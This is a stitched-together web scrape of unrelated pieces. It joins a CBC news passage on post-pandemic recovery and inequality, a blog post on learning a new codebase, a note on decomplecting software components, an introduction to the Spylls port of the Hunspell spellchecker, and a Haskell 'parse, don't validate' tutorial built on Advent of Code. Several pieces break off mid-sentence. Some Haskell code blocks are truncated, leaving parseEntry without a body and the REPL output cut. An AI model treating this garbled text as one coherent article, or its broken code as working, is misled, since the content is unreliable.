 <!-- --> <!-- -->(HBG Canada)</figcaption></figure></span>&nbsp;</p>  <p>However, there are a number of hurdles to overcome before we can begin to put the pandemic behind us, and doing so will be harder for disadvantaged groups, said Christakis, who is also author of a new book called <em>Apollo's Arrow: The Profound and Enduring Impact of Coronavirus on the Way We Live</em>.&nbsp;</p>  <p>"We are in for, still, I would say about a year, into early 2022, of what I would consider to be the initial pandemic period," he told <em>White Coat, Black Art</em> host Dr. Brian Goldman.&nbsp;</p>  <p>"And until that time, we're going to still have to wear masks. We're going to have to physical-distance. There's going to be intermittent school closures and business closures and gathering bans. People are going to be worried still."</p>    <p>But in early 2022, said Christakis, "we'll reach a very important milestone, which is when we will reach something called herd immunity."</p>  <p>Other public health leaders, including Dr. Anthony Fauci, director of the National Institute of Allergy and Infectious Diseases in the United States, have also pegged the beginning of 2022 as the likely time frame for sufficient immunization to achieve herd immunity.</p>  <p>"And then we will enter the intermediate pandemic period, which will last a couple of years until 2024."</p>  <p>That's when the post-pandemic period can truly begin, Christakis said.</p>  <p>"At that point, the biological and epidemiological force of the epidemic will be behind us. The virus will still be there. It could still cause people to get infected — even kill some people — but it will no longer have that epidemic power that it had before."&nbsp;</p>  <p>Then a recovery from the social, psychological and economic impacts of the virus can get underway in earnest.&nbsp;</p>  <p>"If you look at the history of epidemics … this takes time," he said. Consider that Canada alone lost three million jobs in March and April of 2020 when the pandemic started, or that thousands of businesses have closed, for example. "The travel industry has been decimated. People's children have missed lots of school. And so I think that will take a year or two … and here I think we'll finally return to normal."</p>  <h2>'Will relentlessly seek out social interactions'</h2>  <p>Once a relative normal is achieved, many people will be ready to let off some steam.&nbsp;</p>  <p>"What typically happens is people get less religious. They will relentlessly seek out social interactions in nightclubs and restaurants and sporting events and political rallies. There'll be some sexual licentiousness. People will start spending their money after having saved it. They'll be <em>joie de vivre</em> and a kind of risk-taking, a kind of efflorescence of the arts, I think."</p>  <p>Think of how the 1920s became known as the "jazz age" and gave rise to the Harlem Renaissance, a revival of African American art and literature.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5866654.1610136586!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/amelie-quesnel-valle.jpg 300w,https://i.cbc.ca/1.5866654.1610136586!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/amelie-quesnel-valle.jpg 460w,https://i.cbc.ca/1.5866654.1610136586!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/amelie-quesnel-valle.jpg 620w,https://i.cbc.ca/1.5866654.1610136586!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/amelie-quesnel-valle.jpg 780w,https://i.cbc.ca/1.5866654.1610136586!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/amelie-quesnel-valle.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5866654.1610136586!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/amelie-quesnel-valle.jpg"></p></div><figcaption>Amélie Quesnel-Vallée, a sociology professor at McGill University who holds the Canada Research Chair in Policies and Health Inequalities, said she's deeply concerned about the ways inequality will affect how some groups recover from the COVID-19 crisis. <!-- --> <!-- -->(Owen Egan)</figcaption></figure></span></p>  <p>But just as the COVID-19 crisis has highlighted inequality in society by <a href="https://www.cbc.ca/news/canada/toronto/toronto-covid-19-data-1.5669091">disproportionately affecting some groups</a>, not everyone will be equally able to enjoy the fruits of a 1920s-style period of exuberance and prosperity that emerges, he said.</p>  <p>For example, because women have been both more affected by job loss and more likely to carry the caregiving burden for sick loved ones or children who are out of school, we may "lose 10 or 20 years of gains in women's labour market participation," said Christakis.</p>  <p>People with low income are also especially vulnerable to COVID-19 and its many complex socio-economic side effects.</p>  <p>"It's hard for me to imagine a world in which being poor...doesn't place you at greater risk for a pathogen... The rich are able to insulate themselves from many risks to their health and safety," he said.</p>  <p>Medical sociologist Amélie Quesnel-Vallée, a professor at McGill University in both the departments of sociology and epidemiology, says COVID-19 has reinforced that "the social determinants of health will play out no matter what."</p>  <p>She points out that although the first cases in Canada were among the relatively affluent who could afford to travel abroad, "within a matter of weeks, it had spread to most deprived neighbourhoods that were affected by&nbsp;<a href="https://www.cbc.ca/news/canada/montreal/montreal-discrimination-covid-19-rich-poor-1.5551622">high residential density and low socio-economic status</a>, and those individuals who were more likely to find themselves in positions of not being able to physically distance."</p>  <p>Those low-income workers — more likely to be people of colour — have been more dramatically affected by both the illness and loss of income, said Quesnel-Vallée, who holds the Canada Research Chair in Policies and Health Inequalities and a PhD in sociology. "Tiff Macklem, the governor of the Bank of Canada, actually in October really <a href="https://www.cbc.ca/news/politics/economic-recovery-tiff-macklem-1.5785034"><u>sounded the alarm bell</u></a> about that group," pointing out that their labour force participation was about 20 per cent below their pre-pandemic levels.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5561060.1588943638!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/covid-economy-20200409.jpg 300w,https://i.cbc.ca/1.5561060.1588943638!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/covid-economy-20200409.jpg 460w,https://i.cbc.ca/1.5561060.1588943638!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/covid-economy-20200409.jpg 620w,https://i.cbc.ca/1.5561060.1588943638!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/covid-economy-20200409.jpg 780w,https://i.cbc.ca/1.5561060.1588943638!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/covid-economy-20200409.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5561060.1588943638!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/covid-economy-20200409.jpg"></p></div><figcaption>People line up at a Service Canada office in Montreal on March 19, 2020.

people who did not qualify for the Canada Emergency Response Benefit — perhaps because they work outside of the formal economy in "grey market" jobs, or did not meet minimum income requirements from the previous year — represent a third group of disproportionately affected people who are not well poised to recover well from the pandemic, she said.</p>  <h2>Long-term impacts on health and economic status</h2>  <p>These groups may not easily be able to get a foothold into the labour market again, either because their work will have disappeared with a business that shuttered, or an industry — such as tourism — that could be altered for years to come, or because younger entrants to the labour market will take those jobs, said Quesnel-Vallée.&nbsp;&nbsp;</p>    <blockquote><span><span><svg

<span><a href="https://www.samueltaylor.org/index.html">Home</a> &gt; <a href="https://www.samueltaylor.org/articles/index.html">Articles</a> &gt; new codebase, who dis? (How to Join a Team and Learn a Codebase)</span>

<p>I have switched teams more often than I have had to implement an AVL tree, and you can guess which one of those two was taught in school. I wish someone had taught me how to join a new team! While learning a new codebase can be daunting, I've found a few things that work for me.</p>
<p>You should do at least three things when joining a new team. The order of these three can be whatever you like, but all three should be done as soon as reasonably possible.</p>
<p><strong>First</strong>, you’ll likely set up the development environment. As you do this, pay attention to just what it is that you're setting up. For instance, if you need to get Redis running locally, then that's a good hint that there's some caching happening somewhere. Noting the order in which you run internal projects helps you understand dependencies. If the feature store needs to be running before you bring up the model serving service, that's a hint that the model serving service may depend upon the feature store. Such dependencies start to hint at the overall architecture.</p>
<p>Take notes on the exact commands you’re running and packages you’re installing. You’re bound to run into something that’s changed since the setup docs were written, and being able to correct them is a quick win you can provide to the new team. Plus, it's good to know exactly how you ruined your system installation of Python.</p>
<p>Ideally, the code you're working on should have some sort of automated test suite in place. A good way to start experimenting with and understanding the code is to get that test suite successfully running, then make changes to the codebase completely at random and see what breaks.</p>
<p>The <strong>second</strong> thing you should do is get some overview of the architecture. Some teams will have a document describing this, and if that document is an accurate depiction of reality then you should certainly work to understand it. In any case, asking a more senior person on the team to give you an overview is a good idea. They should know how up-to-date that document is (if it does exist) and also be able to describe and/or draw the architecture for you. Here are some sample questions you can consider asking:</p>
<ul>
<li>What repositories (or portions of repositories) do we own and/or work on most frequently? What do each of them do?</li>
<li>Where does our code run? (e.g. EC2 Instances, Google's Kubernetes Engine, on prem)</li>
<li>What does the deployment pipeline look like? How does a feature get from my laptop to live in production?</li>
<li>Do we have certain services, packages, classes, or files that are a real headache? Areas that are particularly unreliable or error-prone?</li>
<li>Are there external API's, vendors, or products that we use or rely on? (e.g. SendGrid, DataDog, MySQL)</li>
</ul>
<p>Similar to environment setup, an easy thing you can do to help the team is to document that architectural overview (or update the existing document). Write down what you learned, take a picture of the diagrams that were drawn, and post that information somewhere visible to the team. Be sure to put an "as of" date on your changes. Even stable projects exhibit some change over a long enough time period, so this date will help future readers know if they can trust this document.</p>
<p>A <strong>third</strong> thing you should do when starting on a new team is start understanding the business. If you're new to the company, figure out its mission, product offering(s), and goal(s). Then work to understand how your team fits into those things. Some sample questions include:</p>
<ul>
<li>How can our team make an impact on the company's goals?</li>
<li>If our code were to break horrifically, who would get angry? How fast would that happen?</li>
<li>What other teams do we have the most interaction with? What services/codebases do they own? Do we share parts of our codebase with other teams?</li>
</ul>
<p>Without an understanding of the team's place in the company, you're doomed. You won't have sufficient context to execute your work well.</p>
<h2>Mindset</h2>
<p>I strongly believe that learning a new codebase happens best through implementing real features (even if they are small to start with). The whole point of being on this team as an individual contributor is to build stuff, and there is no better way to learn how to do something than by spending quality time doing that exact thing. As you build skill and understanding, you can work on larger and larger projects over time.</p>
<p>Implementing something will require you to read the code. But "read" may be a misleading word here, because reading code is dramatically different from reading a novel. Code is typically organized with more related code being closer together (in the same directory, package, class, or file). Can you imagine a novel written in this way? If Tolkien had placed all scenes of two characters fighting each other in adjacent pages, while all scenes with magic in them occurred in a separate book? How absurd!</p>
<p>Though learning to code taught me the basics of reading code, nobody ever taught me how to read a large codebase. To do so, we must adopt a certain mindset. Balance understanding each intricate detail against making impact quickly. Quick impact helps establish your reputation on the team and gets you to that accurate/intricate understanding faster than trying to read everything up front.</p>
<p>The rule of thumb I use is to understand something just enough to express what it does without necessarily knowing exactly how it does that. This process is called "chunking," and it relies on the fact that once you have a basic understanding of a unit of code, "you don't need to remember all the little underlying details" (Oakley). If you're worried about not understanding everything in minute detail, don't be afraid to take a note to come back and understand that chunk more fully.</p>
<p>This understanding will grow recursively: first, you understand what the various services do. Then, you identify the particular service you need to modify and start to understand the various modules within that service. In the modules you modify, you'll start to understand the classes contained. The base case of this recursive process is the individual line.</p>
<p>Keep in mind that different teams may implement the same concept or pattern in different ways. Understanding why your current team chose the way they did is another way new teammates can help the team. It's totally possible that your new team hasn't heard of the cool way to implement singletons that you like. It's equally possible that your way is worse in some way you didn't know. Either way, someone gets to learn something!</p>
<p>The last mindset recommendation I'll give before we dive into the process is to try to understand the code both in terms of code paths and data flows. Think about which objects know what information and how that information flows between parts of the system.</p>
<h2>Process</h2>
<p>I recommend this process for working in any codebase:</p>
<ol>
<li><strong>Locate the portion of code most relevant to the immediate task</strong> at hand.</li>
<li>Understand that code enough to <strong>form a hypothesis</strong> about the change you need to make.</li>
<li>Make that change and <strong>test your hypothesis</strong>. Sometimes the best way will be to click around in the UI or run a particular script. Sometimes the easiest path is to write a test that describes the behavior you're after.</li>
<li>If your hypothesis was incorrect, return to step 2. Understand why that change didn't do what you thought it would, and develop a new hypothesis.</li>
<li>Once you have working code, <strong>improve its quality</strong>. Write a test (or a few) that document the changes in behavior you made. Refactor your code for clarity and style.</li>
</ol>
<p>This scientific approach guides us gradually toward correct, high quality code without having to understand each and every bit of code around our change.</p>
<h2>Tools</h2>
<p>While you could certainly get by with just a text editor and some patience, a wide variety of tools exist that help us read code more effectively throughout the process identified above.</p>
<h3>Identifying relevant code</h3>
<p>While step one gets easier over time as we build familiarity with some portion of code, we often begin step one completely lost. A few approaches are helpful here: running the code, project search, and code search.</p>
<p>Running the code helps you understand it. Before you start changing things, understand what already exists. This could mean reproducing a bug locally, finding the place in the UI where the new feature will go, or any number of other things. When you do, stepping through the execution in a debugger will give you a strong start on understanding what is going on.</p>
<p>By "project search," I mean searching artifacts created as part of the software development lifecycle. Particularly useful are issue trackers like JIRA/Asana/Pivotal Tracker, pull requests and issues in tools like GitHub and GitLab, and the git history itself. Because few tasks are truly novel, we can often gain understanding by looking for similar past work. Try several different keywords. Sometimes you'll find a pull request that implements something very similar to what you want to do, and you can use that as a guide. Trying to divine something from scratch, while sometimes necessary, requires significantly more effort than adapting from an example.</p>
<p>Code search is just what it sounds like. For code that you have checked out locally, I highly recommend using a tool specifically built for recursive search like ack, Silver Searcher (ag), or ripgrep. But you won't always have every bit of code at the company checked out locally, and sometimes it's useful to be able to search exhaustively. For this use case, tools like OpenGrok or Sourcegraph are super helpful. GitHub and GitLab also offer ways to search all code within a specific organization.</p>
<p>No matter which tool you're using, try several keywords you think might be relevant. Consider changing case sensitivity. You may have better results filtering down to specific file types.</p>
<h3>Understanding code</h3>
<p>Using these various search tools, we arrive at a set of relevant locations. Thus, we arrive into step two of our process: …</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When building software, we introduce changes to the system. To change the system, we first need to understand the system. Each system consists of components. So to change the system, we need to understand its components. What makes components hard to understand?</p>
<p>Imagine component A intertwines with component B. And B intertwines with C. And C intertwines with D. To change component A, we need to dive into B and C and D. But we are limited in our cognitive capacity; in our heads we can consider <a href="https://en.wikipedia.org/wiki/The_Magical_Number_Seven,_Plus_or_Minus_Two">at most a few things</a> at a time. So to change a component, we need to understand the whole braid of intertwined components. That takes time.</p>
<blockquote>
<p>Everytime you combine two things, you twist two more things. So every intertwining adds this burden, and the burden is combinatorial. Fundamentally, this complexity, this twisting, limits our capability to understand our systems.</p>
<p>Rich Hickey, <a href="https://www.infoq.com/presentations/Simple-Made-Easy/">Simple Made Easy</a></p>
</blockquote>
<p>To gain speed, we decomplect the <em>complex</em> braid and turn it into a set of <em>simple</em> components. A simple component consists of one fold, of one braid, of one ingredient. A simple component doesn't intertwine with other components. To change a simple component, we don't spend time understanding the whole braid. And so we are faster.</p>

    <h2 id="how-i-decided-to-write-a-spellchecker-and-almost-died-trying">How I decided to write a spellchecker and almost died trying</h2>

<p>A few years ago I had a fun idea for a “weekend project”: pure-Ruby spellchecker. Ruby is my language of choice, and no-dependencies spellchecker seemed a small useful tool for the CI environment: for example, to check comments/docs spelling without installing any third-party software. I actually <em>could’ve</em> pulled out the project in its limited scope (only English, only spot misspelled words without fixing, limited dictionary) with just a flat list of known words, but that’s not what happened.</p>

<p>Back then, I decided to make a moderately generic tool, at least able to work with multiple languages. Fortunately (or so I believed!), there were many already existing and freely available spellchecking dictionaries distributed as LibreOffice and Firefox extensions. All of those dictionaries are in the format defined by the <strong><a href="http://hunspell.github.io/">Hunspell</a></strong> tool/library—which is an open-source library that is used for spellchecking in Libre/OpenOffice, Mozilla products (Firefox, Thunderbird), but also Google Chrome/Chromium, macOS, several Adobe products, and so on.</p>

<p>The dictionaries looked like easy to reuse text files with some (“insignificant” as it seemed) metadata, and the whole “use Hunspell dictionaries from pure Ruby spellchecker” project <em>still</em> felt like a “weekend-long” one, for the first few weekends. Only gradually the underwater complexity of the multilanguage word-by-word spellchecking uncovered. Eventually, I was distracted from the project and abandoned it, but I still had the fascination with the seemingly-simple, actually-mind-blowingly-complicated Hunspell, the software everybody used daily and hardly ever notice.</p>

<p>The idea to dig deeper into it, to <em>understand</em> it and <em>explain</em>, grew on me and bothered me for quite some time. And what is a better way to understand something, if not to retell it in your own words? After several lazy and not very far-progressed attempts to write something Hunspell-alike (twice in Ruby, once in Rust, once in Python), eventually, in February 2020, the task I settled down to solve is: “explanatory rewrite” of the Hunspell into high-level language with a lot of comments. I achieved this goal by December 2020, with the first release of the <a href="https://github.com/zverok/spylls">Spylls</a> project: <strong>the port of Hunspell’s core algorithms into modern, well-documented, well-structured Python</strong>.</p>

<p>And now I want to share some insights of what I uncovered on the road: about spellchecking in general and Hunspell in particular.</p>

<p>In the ongoing article series, I’ll cover these topics:</p>

<ul>
  <li>What is Hunspell, why is it significant, and why try to “explain” it (current article)</li>
  <li>Base spellchecking concepts: lookup and suggest, as seen by Hunspell</li>
  <li>How lookup (checking if the word is correct) works, and why it could be much more complicated than “just look in the list of the known words”</li>
  <li>How suggest (proposed fix for the incorrect word) works, and how hard it is to estimate its quality</li>
  <li>A closer look into Hunspell’s dictionary format. It is the most widespread open dictionary format in the world, and we’ll see what linguistic and algorithmic information it <em>potentially</em> can carry, and what part of it is actually used in existing dictionaries</li>
  <li>Some details on Spylls implementation process and results</li>
  <li>Closing thoughts on the big picture of word-by-word spellchecker problem, and Hunspell’s approach to it</li>
</ul>

<h3 id="what-is-hunspell">What is Hunspell?</h3>

<blockquote>
  <p><strong>Note:</strong> The information on Hunspell’s origins and history is mostly my guesses, following partial and incomplete sources everywhere.</p>
</blockquote>

<p>Hunspell (<small><a href="https://en.wikipedia.org/wiki/Hunspell">Wikpedia article</a></small>), initially <strong>Hun</strong>garian spellchecker, emerged as an alternative for previously existing aspell/ispell/myspell somewhere in 2002 (I guess?). It was created by László Németh, in a need of supporting languages with complicated suffixing/prefixing rules and word compounding (such as Hungarian). Hunspell’s design seemingly proved itself to be flexible enough to support most of the world’s languages, and in a few years, it became the most used spellchecker in the world. You have most probably used it even if you’ve never heard the name before today: Hunspell is the default spellchecking engine in Chrome and Firefox, Libre/OpenOffice, Adobe products, and macOS (not an exhaustive list). Dictionaries in Hunspell format exist for almost all actively used languages for which the concept of word-by-word spellchecking makes sense<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>Currently, Hunspell is maintained <a href="https://github.com/hunspell/hunspell">on GitHub</a> (repo has only around 1k stars, will you believe it?). It seems that maintenance is not that easy if you’ll weight the number of open issues and PRs, and the latest commits timeline: at the time of writing it (Jan 2021), the last commit to master was of May 2020, and the last release was 1.7 on Dec 2018. Hunspell’s codebase is mostly “old-school” C++. It is being slowly modernized and it has very few comments; there are thousands of two-branch <code>if</code>s to handle non-Unicode and Unicode text separately. There is also an attempt to rewrite Hunspell from scratch in a modern C++, which at some point was developed under the <code>hunspell</code> GitHub organization. Now it is independent and called <a href="https://github.com/nuspell/nuspell">nuspell</a> (and, while not yet supporting all of the Hunspell features, already “achieved” version 4.2.0).</p>

<p>Obviously, there are open-source spellcheckers other than Hunspell. GNU aspell (that at one point was superseded by Hunspell, but still holds its ground in English suggestion quality), to name one of the older ones; but also there are novel approaches, like <a href="https://github.com/wolfgarbe/SymSpell">SymSpell</a>, claiming to be “1 million times faster” or ML-based <a href="https://github.com/bakwc/JamSpell">JamSpell</a>, claiming to be much more accurate.</p>

<p>And yet, what makes Hunspell stand out is its coverage of the world’s languages. It is not ideal, but the amount of dictionaries ready to use immediately, and amount of <em>experience</em> of dealing with typical problems and corner cases, coded into the codebase, is hard to beat.</p>

<h3 id="why-rewrite-it">Why rewrite it?</h3>

<p>As I’ve already stated above, the goal of the Spylls project was to create an <em>explanatory</em> rewrite: E.g., the “retelling” of how Hunspell works in a way that is easy to follow and to play with.</p>

<p>The necessity of this approach came to me from three facts:</p>

<ol>
  <li>Hunspell is used almost everywhere and is taken for granted;</li>
  <li>It is much more complicated than one might naively expect;</li>
  <li>This complexity—and years of human work that was spent growing the project—is notoriously hard to follow through the Hunspell’s codebase and grasp in full.</li>
</ol>

<p>In other words, I wanted to <strong>make the knowledge behind Hunspell more open</strong>.</p>

<p>The way I have chosen was not, of course, the only one possible. I could’ve just read through the original code and write a series of articles (or, rather, a book?) on how it works. I could’ve thoroughly commented and republished the original source code. But I felt that <em>reimplementing</em> is the only way of understanding what’s and why’s of the algorithms (at least for somebody not being a Hunspell’s core developer); and that implementation in a high-level language will allow focusing on words and language-related algorithms, not memory management or fighting with Unicode.</p>

<blockquote>
  <p>Note that there are also a few “pragmatic” ports of Hunspell into other languages (in order to use it in environments where C++ dependency is undesireable), namely <a href="https://github.com/aarondandy/WeCantSpell.Hunspell">WeCantSpell.Hunspell</a> in C# and <a href="https://github.com/wooorm/nspell">nspell</a> in JS (very incomplete); and aforementioned <a href="https://github.com/nuspell/nuspell">nuspell</a> can also be considered a “port” (from legacy C++ to a modern one).</p>
</blockquote>

<h3 id="why-python">Why Python?</h3>

<p>My language of choice is Ruby. It was also the first language that I’ve tried to port Hunspell into. I’d be happy to proceed with Ruby if my goal has been just a “pragmatic” library. And yet, when I decided that my goal is to make the knowledge of Hunspell’s algorithms accessible to a wide audience, I understood that Ruby is not the best choice: language reputation (slightly esoteric and mostly-for-web) would make my project lest noticeable; and my preferred coding style (mix of OO and functional, with lots of small immutable domain objects and fluent chains of iterators), while allowing me to be very effective, would make the code less accessible to other languages users.</p>

<p>What I needed was a high-level language, with as low boilerplate as possible; as mainstream as possible; as easy to experiment with and prototype as possible. Without diving into too much argument here, Python and modern JavaScript seemed to be the most suitable options, and, to be honest, Python was just closer to my soul. So, here we are!</p>

<p>The code style is mostly imperative (as it corresponds to how Hunspell is structured), with large-ish, but clearly structured methods, and a small number of classes/objects (mostly they are either “whole algorithm as a class” or almost-passive “structs” – or, in Python, dataclasses). I tried to limit myself in the usage of complex Python-specific features (like functools or itertools), but have a decent use of “list comprehensions” (as they are quite readable and Pythonic) and generators (lazy lists). Overall, I wanted the code to be good Python, but not too smart. Whether I succeeded, is up to you to decide.</p>

<p>Currently, <a href="https://github.com/zverok/spylls">Spylls</a> has <strong>≈1.5k lines of library code</strong> in 14 files. It conforms (with <a href="https://spylls.readthedocs.io/en/latest/#completeness">some reservations</a>) to all Hunspell’s integrational tests. Those tests look like a set of files each, consisting of “test dictionary + what words should be considered good, what words should be considered bad, what should be suggested instead of the bad words”, and there are <strong>127 of such sets to pass</strong>. There are <strong>2 thousand comment lines</strong> in the code, explaining thoroughly every detail of the algorithm and rendered at the <a href="https://spylls.readthedocs.io/en/latest/hunspell.html">Spylls documentation site</a>; note that besides docstrings at the beginning of each class and method, there are also inline comments in code—that’s why the documentation site uses custom theme with inline “Show code” feature.</p>

<p>With this being said, I am wrapping up the introductory post.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">“Parse, don’t
validate”</a>
has been one of my favourite programming articles for some time. The main
gist of the article is that, when writing in a type-driven fashion, your
snappy slogan should be:</p>
<blockquote>
<p>Parse, don’t validate.</p>
</blockquote>
<p>The core difference between parsing and validating can be explained by
looking at two very similar functions:</p>
<div data-language="haskell"><pre><code><span>parseInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span>
<span>parseInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span>

<span>validateInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Bool</span>
<span>validateInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span> <span>/=</span> <span>Nothing</span></code></pre></div>
<p>As you can see, they look very similar. The main difference is that
<code>parseInt</code> returns a useful value, the <code>Int</code> that we wanted to parse, while
<code>validateInt</code> takes that useful value and throws it away. This is also
mentioned in the wonderful <a href="https://kowainik.github.io/posts/haskell-mini-patterns#evidence">Haskell Mini-Patterns
Handbook</a>
as the “Evidence” pattern.</p>
<blockquote>
<p>The key issue here is that by calling a function that returns Bool you
lose the information about earlier performed validation. Instead, you can
keep this information by explicitly pattern-matching on the validation or
result.</p>
</blockquote>
<p>In this post, I would like to go through a practical example that shows the
power of bringing this concept to its limits. Which brings us to…</p>
<h2>Advent of Code 2020, Day 4</h2>
<p>We <a href="https://adventofcode.com/2020/day/4">are tasked</a> with parsing a batch
of passports composed of these fields:</p>
<div data-language="plain"><pre><code>- byr (Birth Year)
- iyr (Issue Year)
- eyr (Expiration Year)
- hgt (Height)
- hcl (Hair Color)
- ecl (Eye Color)
- pid (Passport ID)
- cid (Country ID)</code></pre></div>
<p>All the fields are required except for the <code>cid</code> field, which is optional.
Note that the fields can be written in any order, this will be important
later. Our batch is composed of multiple passports separated by empty lines
(the <code>input.txt</code>):</p>
<div data-language="plain"><pre><code>ecl:gry pid:860033327 eyr:2020 hcl:#fffffd
byr:1937 iyr:2017 cid:147 hgt:183cm

iyr:2013 ecl:amb cid:350 eyr:2023 pid:028048884
hcl:#cfa07d byr:1929

hcl:#ae17e1 iyr:2013
eyr:2024
ecl:brn pid:760753108 byr:1931
hgt:179cm

hcl:#cfa07d eyr:2025 pid:166559648
iyr:2011 ecl:brn hgt:59in</code></pre></div>
<ul>
<li>The first passport is <em>valid</em> - all required fields are present.</li>
<li>The second passport is <em>invalid</em> - it is missing <code>hgt</code>.</li>
<li>The third passport is interesting: the only missing field is the optional <code>cid</code>, which makes it <em>valid</em>.</li>
<li>The fourth passport is missing two fields, <code>cid</code> and <code>byr</code>. Missing <code>cid</code> is fine, but missing <code>byr</code> is not, so this passport is <em>invalid</em>.</li>
</ul>
<p>The challenge is to count <strong>how many passports</strong> are <strong>valid</strong> in the given
batch.</p>
<p>Let’s write some code to open the file and parse each group of passport
fields:</p>
<div data-language="haskell"><pre><code><span>module</span> <span>Main</span> <span>where</span>

<span><span>import</span> <span>qualified</span> Data.List.Split <span>as</span> S</span>

<span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>entries</span>

<span>data</span> <span>PassportEntry</span> <span>=</span> <span>PassportEntry</span>
  <span>deriving</span> <span>(</span><span>Show</span><span>)</span>

<span>parseEntry</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>PassportEntry</span>
<span>parseEntry</span> <span>text</span> <span>=</span> <span>undefined</span></code></pre></div>
<p>Nothing too fancy here, we’re using <code>Data.List.Split</code> from the <code>split</code>
package to do the heavy lifting. And the implementation of <code>parseEntry</code> has
been conveniently stubbed so that the code compiles.</p>
<p>Now how should our <code>PassportEntry</code> data structure look like? I’d love to
eventually represent passports as:</p>
<div data-language="haskell"><pre><code><span>data</span> <span>Passport</span> <span>=</span> <span>Passport</span>
  <span>{</span> <span>birthYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>issueYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>expirationYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>height</span> <span>::</span> <span>String</span><span>,</span>
    <span>hairColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>eyeColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>passportId</span> <span>::</span> <span>String</span><span>,</span>
    <span>countryId</span> <span>::</span> <span>Maybe</span> <span>Int</span>
  <span>}</span></code></pre></div>
<p>If we imagine parsing each field sequentially, we can see that we won’t be
able to construct this data structure in a single operation. We’ll have to
accumulate the data up until we’re ready to create a proper <code>Passport</code>.</p>
<p>One way to store the fields is to insert them into a hash. First of all,
we’re going to use a custom data type to represent the keys of the hash.
Why is that? We really don’t want to be making typos later when comparing
raw strings like <code>"ecl"</code> and <code>"elc"</code>. We’ll use a <code>HashMap</code> from the
<code>Data.HashMap.Strict</code> module:</p>
<div data-language="haskell"><pre><code><span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>

<span>data</span> <span>PassportField</span>
  <span>=</span> <span>BirthYear</span>
  <span>|</span> <span>IssueYear</span>
  <span>|</span> <span>ExpirationYear</span>
  <span>|</span> <span>Height</span>
  <span>|</span> <span>HairColor</span>
  <span>|</span> <span>EyeColor</span>
  <span>|</span> <span>PassportId</span>
  <span>|</span> <span>CountryId</span>
  <span>deriving</span> <span>(</span><span>Eq</span><span>,</span> <span>Show</span><span>)</span>

<span>type</span> <span>PassportEntry</span> <span>=</span> <span>HM.HashMap</span> <span>PassportField</span> <span>String</span></code></pre></div>
<p>Of course things can’t be that easy. We also need to make our type
implement the <code>Hashable</code> typeclass:</p>
<div data-language="haskell"><pre><code>

<span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>
<span><span>import</span> Data.Hashable</span>
<span><span>import</span> GHC.Generics</span> <span>(</span><span>Generic</span><span>)</span>

<span>data</span> <span>PassportField</span>
  <span>=</span> <span>BirthYear</span>
  <span>|</span> <span>IssueYear</span>
  <span>|</span> <span>ExpirationYear</span>
  <span>|</span> <span>Height</span>
  <span>|</span> <span>HairColor</span>
  <span>|</span> <span>EyeColor</span>
  <span>|</span> <span>PassportId</span>
  <span>|</span> <span>CountryId</span>
  <span>deriving</span> <span>(</span><span>Eq</span><span>,</span> <span>Show</span><span>,</span> <span>Generic</span><span>)</span>

<span>instance</span> <span>Hashable</span> <span>PassportField</span>

<span>type</span> <span>PassportEntry</span> <span>=</span> <span>HM.HashMap</span> <span>PassportField</span> <span>String</span></code></pre></div>
<p>Don’t worry about what we’ve added. Just take them as God-given truths. 👼</p>
<p>Okay, now we can implement our <code>parseEntry</code> function:</p>
<div data-language="haskell"><pre><code><span><span>import</span> Data.Maybe</span> <span>(</span><span>mapMaybe</span><span>)</span>
<span><span>import</span> <span>qualified</span> Data.Char <span>as</span> Char</span>

<span>parseEntry</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>PassportEntry</span>

<p>We try to parse each field (such as <code>byr:2002</code>) into a <code>PassportField</code>
type, then end up building a hash using <code>HM.fromList</code>. We can take this for
a spin:</p>
<div data-language="haskell"><pre><code><span>Prelude</span><span>&gt;</span> <span>:</span><span>l</span> <span>Main.hs</span>

    <span>]</span>
<span>]</span></code></pre></div>
<p>Nice and tidy! 🦾</p>
<p>Now our goal is to verify which one of these groups is valid. First of all,
we should define a list of required fields:</p>
